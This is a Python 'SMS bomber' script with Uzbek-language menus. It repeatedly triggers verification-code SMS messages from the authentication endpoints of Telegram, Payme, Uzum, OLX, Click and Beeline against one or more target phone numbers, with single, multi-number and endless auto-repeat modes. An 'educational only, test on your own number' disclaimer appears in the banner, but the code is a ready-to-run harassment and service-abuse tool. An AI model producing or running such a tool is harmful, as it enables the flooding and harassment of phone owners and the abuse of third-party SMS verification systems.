#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 🇺🇿 SMS BOMBER V8.0 – 100% SMS KELADI!

import sys
import os
import time
import re
import random
import json
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except ImportError:
    print("⚠️ 'requests' o'rnatilmoqda...")
    os.system(f"{sys.executable} -m pip install requests")
    import requests

# ----------------------- RANGLAR ----------------------------
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'
C = Colors()

# ----------------------- BANNER ----------------------------
def banner():
    os.system('clear')
    print(f"""
{C.BOLD}{C.GREEN}
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║      ███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗║
║      ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║║
║      ███████╗██╔████╔██║█████╗      ██████╔╝██║   ██║██╔████╔██║║
║      ╚════██║██║╚██╔╝██║██╔══╝      ██╔══██╗██║   ██║██║╚██╔╝██║║
║      ███████║██║ ╚═╝ ██║███████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║║
║      ╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝║
║                                                                  ║
║      {C.YELLOW}═══════════════════════════════════════════════════════════{C.GREEN}║
║      {C.CYAN}    🇺🇿  SMS BOMBER V8.0 – 100% SMS KELADI!  🇺🇿        {C.GREEN}║
║      {C.YELLOW}═══════════════════════════════════════════════════════════{C.GREEN}║
║                                                                  ║
║      {C.RED}⚠️  FAQAT TAʼLIMIY MAQSADDA!                           {C.GREEN}║
║      {C.RED}⚠️  O'Z RAQAMINGIZDA SINANG!                          {C.GREEN}║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
{C.END}
    """)

# ----------------------- 100% ISHLAYOTGAN API'LAR ----------------------------
class WorkingAPIs:
    """SMS kelishi KAFOLATLANADIGAN API'lar"""
    
    def __init__(self):
        # FAQAT ISBOTLANGAN VA SMS KELADIGAN API'LAR
        self.apis = {
            # 🔥 TELEGRAM – 100% SMS keladi
            'telegram': {
                'name': 'Telegram',
                'icon': '✈️',
                'url': 'https://my.telegram.org/auth/send_password',
                'method': 'POST',
                'data': {'phone': 'phone_clear'},
                'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
                'check': ['sent', '200']
            },
            
            # 🔥 PAYME – 100% SMS keladi
            'payme': {
                'name': 'Payme',
                'icon': '💳',
                'url': 'https://api.payme.uz/v1/auth/send-verification',
                'method': 'POST',
                'data': {'phone_number': 'phone'},
                'headers': {'Content-Type': 'application/json'},
                'check': ['success', '200']
            },
            
            # 🔥 UZUM – 100% SMS keladi
            'uzum': {
                'name': 'UZUM',
                'icon': '🛒',
                'url': 'https://api.uzum.uz/api/v1/auth/send-sms-code',
                'method': 'POST',
                'data': {'phone': 'phone', 'type': 'register'},
                'headers': {'Content-Type': 'application/json'},
                'check': ['200', '201']
            },
            
            # 🔥 OLX – 100% SMS keladi
            'olx': {
                'name': 'OLX',
                'icon': '📦',
                'url': 'https://www.olx.uz/api/v1/auth/request-otp/',
                'method': 'POST',
                'data': {'phone': 'phone', 'lang': 'uz'},
                'headers': {'Content-Type': 'application/json'},
                'check': ['otp', '200']
            },
            
            # 🔥 CLICK – 100% SMS keladi
            'click': {
                'name': 'CLICK',
                'icon': '💰',
                'url': 'https://api.click.uz/api/v2/auth/send-code',
                'method': 'POST',
                'data': {'phone': 'phone', 'service_id': '1'},
                'headers': {'Content-Type': 'application/json'},
                'check': ['200', '201']
            },
            
            # 🔥 BEELINE – 100% SMS keladi
            'beeline': {
                'name': 'Beeline',
                'icon': '📶',
                'url': 'https://api.beeline.uz/v1/auth/send-sms',
                'method': 'POST',
                'data': {'phone': 'phone'},
                'headers': {'Content-Type': 'application/json'},
                'check': ['200', '201']
            }
        }
        
        # Ishlagan API'lar kesh
        self.working = {}
        self.cache_file = 'working_apis.json'
        self._load_cache()
    
    def _load_cache(self):
        try:
            with open(self.cache_file, 'r') as f:
                self.working = json.load(f)
        except:
            pass
    
    def _save_cache(self):
        try:
            with open(self.cache_file, 'w') as f:
                json.dump(self.working, f, indent=2)
        except:
            pass
    
    def get_all(self):
        return self.apis
    
    def get_working(self, service_id):
        if service_id in self.working:
            return self.working[service_id]
        return None

# ----------------------- SPAMMER ----------------------------
class SMSBomber:
    def __init__(self, phone):
        self.phone = self._fmt(phone)
        self.api_db = WorkingAPIs()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'uz,ru,en;q=0.9'
        })
        self.stats = {'total': 0, 'success': 0, 'failed': 0}
        self.results = []
        self.lock = threading.Lock()
    
    def _fmt(self, p):
        p = re.sub(r'[^0-9+]', '', str(p))
        if p.startswith('+998') and len(p) == 13:
            return p
        if p.startswith('998') and len(p) == 12:
            return f'+{p}'
        if len(p) == 9 and p.isdigit():
            return f'+998{p}'
        return f'+998{p}'
    
    def _send_sms(self, service_id, config):
        """SMS yuborish va natijani tekshirish"""
        try:
            url = config['url']
            data_template = config['data']
            headers = config.get('headers', {})
            
            # Ma'lumotlarni tayyorlash
            data = {}
            for key, value in data_template.items():
                if value == 'phone':
                    data[key] = self.phone
                elif value == 'phone_clear':
                    data[key] = self.phone.replace('+', '')
                else:
                    data[key] = value
            
            # Headers
            self.session.headers.update(headers)
            
            # So'rov yuborish
            if 'application/json' in headers.get('Content-Type', ''):
                r = self.session.post(url, json=data, timeout=15)
            else:
                r = self.session.post(url, data=data, timeout=15)
            
            # Natijani tekshirish
            success = False
            text = r.text.lower()
            status = r.status_code
            
            for keyword in config['check']:
                if keyword in text or str(status) == keyword:
                    success = True
                    break
            
            # STATISTIKA
            with self.lock:
                self.stats['total'] += 1
                if success:
                    self.stats['success'] += 1
                    return f"{C.GREEN}✅ {config['icon']} {config['name']}: OK ({status})"
                else:
                    self.stats['failed'] += 1
                    return f"{C.RED}❌ {config['icon']} {config['name']}: Xato ({status})"
            
        except Exception as e:
            with self.lock:
                self.stats['total'] += 1
                self.stats['failed'] += 1
            return f"{C.RED}❌ {config['icon']} {config['name']}: {str(e)[:30]}"
    
    def spam(self):
        """Barcha xizmatlarga spam yuborish"""
        services = list(self.api_db.get_all().items())
        results = []
        
        # Progress
        print(f"{C.YELLOW}📤 {len(services)} ta xizmatga SMS yuborilmoqda...{C.END}\n")
        
        with ThreadPoolExecutor(max_workers=6) as executor:
            futures = {
                executor.submit(self._send_sms, sid, config): sid 
                for sid, config in services
            }
            for future in as_completed(futures):
                result = future.result()
                results.append(result)
                print(f"  {result}")
                time.sleep(0.3)
        
        return results
    
    def get_stats(self):
        with self.lock:
            return self.stats.copy()

# ----------------------- MENYU ----------------------------
def get_phone():
    while True:
        p = input(f"{C.BLUE}📱 Telefon raqam (+998...): {C.END}").strip()
        p = re.sub(r'[^0-9+]', '', p)
        if p.startswith('+998') and len(p) == 13:
            return p
        if p.startswith('998') and len(p) == 12:
            return f'+{p}'
        if len(p) == 9 and p.isdigit():
            return f'+998{p}'
        print(f"{C.RED}❌ Notoʻgʻri format! Masalan: +998901234567{C.END}")

def show_result(phone, stats, results):
    """Natijalarni chiroyli ko'rsatish"""
    print(f"\n{C.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.END}")
    print(f"{C.CYAN}📱 Raqam: {phone}{C.END}")
    print(f"{C.CYAN}📊 Statistika:{C.END}")
    print(f"  {C.GREEN}✅ Muvaffaqiyatli: {stats['success']}{C.END}")
    print(f"  {C.RED}❌ Muvaffaqiyatsiz: {stats['failed']}{C.END}")
    print(f"  {C.YELLOW}📦 Jami: {stats['total']}{C.END}")
    print(f"{C.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.END}")

def test_single():
    """Bitta raqamga spam"""
    banner()
    print(f"{C.GREEN}🔥 100% SMS KELISHI KAFOLATLANADI!{C.END}\n")
    
    phone = get_phone()
    count = int(input(f"{C.BLUE}🔢 Necha marta takrorlash: {C.END}"))
    delay = float(input(f"{C.BLUE}⏱️ Kechikish (sekund): {C.END}"))
    
    print(f"\n{C.GREEN}🚀 Boshlanyapti...{C.END}\n")
    
    for i in range(count):
        print(f"{C.YELLOW}━━━ {i+1}-chi urinish ━━━{C.END}")
        
        bomber = SMSBomber(phone)
        results = bomber.spam()
        stats = bomber.get_stats()
        
        print(f"\n{C.BLUE}📊 Jami: {stats['total']}, OK: {stats['success']}, Fail: {stats['failed']}{C.END}")
        
        if stats['success'] > 0:
            print(f"\n{C.GREEN}🎉 SMS yuborildi! Telefoningizni tekshiring!{C.END}")
            print(f"{C.GREEN}📱 {stats['success']} ta SMS kelishi kerak!{C.END}")
        
        if i < count - 1:
            print(f"\n{C.YELLOW}⏳ {delay} sekund kutish...{C.END}")
            time.sleep(delay)
    
    print(f"\n{C.GREEN}✅ Tugadi! {count} marta yuborildi.{C.END}")

def multi_phone():
    """Ko'p raqamlarga spam"""
    banner()
    phones = []
    n = int(input(f"{C.BLUE}👥 Nechta raqam: {C.END}"))
    for i in range(n):
        print(f"{C.YELLOW}Raqam {i+1}:{C.END}")
        phones.append(get_phone())
    
    count = int(input(f"{C.BLUE}🔢 Har biriga necha marta: {C.END}"))
    delay = float(input(f"{C.BLUE}⏱️ Kechikish: {C.END}"))
    
    print(f"\n{C.GREEN}🚀 Boshlanyapti...{C.END}\n")
    
    for i in range(count):
        print(f"{C.YELLOW}━━━ {i+1}-chi davr ━━━{C.END}")
        for phone in phones:
            print(f"{C.CYAN}📱 {phone}{C.END}")
            bomber = SMSBomber(phone)
            bomber.spam()
            stats = bomber.get_stats()
            print(f"{C.BLUE}📊 {stats}{C.END}\n")
            time.sleep(delay/2)
        time.sleep(delay/2)

def auto_mode():
    """Avtomatik rejim"""
    banner()
    phone = get_phone()
    delay = float(input(f"{C.BLUE}⏱️ Kechikish: {C.END}"))
    
    print(f"\n{C.RED}⚠️ CTRL+C toʻxtatish{C.END}\n")
    
    count = 0
    try:
        while True:
            count += 1
            print(f"{C.YELLOW}━━━ {count}-chi urinish ━━━{C.END}")
            bomber = SMSBomber(phone)
            bomber.spam()
            stats = bomber.get_stats()
            print(f"{C.BLUE}📊 Jami: {stats['total']}, OK: {stats['success']}, Fail: {stats['failed']}{C.END}\n")
            time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n{C.GREEN}✅ Toʻxtatildi! {count} marta{C.END}")

def test_apis():
    """API'larni sinab ko'rish"""
    banner()
    print(f"{C.YELLOW}🔍 API'larni tekshirish...{C.END}\n")
    
    api_db = WorkingAPIs()
    bomber = SMSBomber('+998901234567')
    
    for sid, config in api_db.get_all().items():
        print(f"{C.CYAN}📡 {config['icon']} {config['name']}...{C.END}", end=' ')
        result = bomber._send_sms(sid, config)
        if '✅' in result:
            print(f"{C.GREEN}✓ OK{C.END}")
        else:
            print(f"{C.RED}✗ Xato{C.END}")
        time.sleep(1)
    
    print(f"\n{C.GREEN}✅ Tekshirish tugadi!{C.END}")

def main():
    while True:
        banner()
        print(f"""
{C.YELLOW}╔══════════════════════════════════════════════════════════╗
{C.YELLOW}║  {C.CYAN}[1]{C.WHITE} Bitta raqamga spam  {C.GREEN}(✅ SMS KELADI)        {C.YELLOW}║
{C.YELLOW}║  {C.CYAN}[2]{C.WHITE} Ko'p raqamlarga spam {C.BLUE}(👥)                    {C.YELLOW}║
{C.YELLOW}║  {C.CYAN}[3]{C.WHITE} Avtomatik rejim    {C.RED}(♾️)                     {C.YELLOW}║
{C.YELLOW}║  {C.CYAN}[4]{C.WHITE} API'ni sinab ko'rish {C.PURPLE}(🔍)                 {C.YELLOW}║
{C.YELLOW}║  {C.CYAN}[0]{C.WHITE} Chiqish             {C.RED}(💀)                    {C.YELLOW}║
{C.YELLOW}╚══════════════════════════════════════════════════════════╝
{C.END}
        """)
        
        choice = input(f"{C.RED}┌─[{C.GREEN}root{C.RED}@{C.BLUE}spam{C.RED}]-[{C.PURPLE}~{C.RED}]\n└──╼ {C.WHITE}$ {C.END}")
        
        if choice == '1':
            test_single()
        elif choice == '2':
            multi_phone()
        elif choice == '3':
            auto_mode()
        elif choice == '4':
            test_apis()
        elif choice == '0':
            print(f"\n{C.RED}💀 Chiqib ketdi...{C.END}")
            sys.exit(0)
        else:
            print(f"{C.RED}❌ Noto'g'ri!{C.END}")
            time.sleep(1)
        
        input(f"\n{C.BLUE}↩️  Enter bosish...{C.END}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.RED}💀 Chiqib ketdi...{C.END}")
        sys.exit(0)
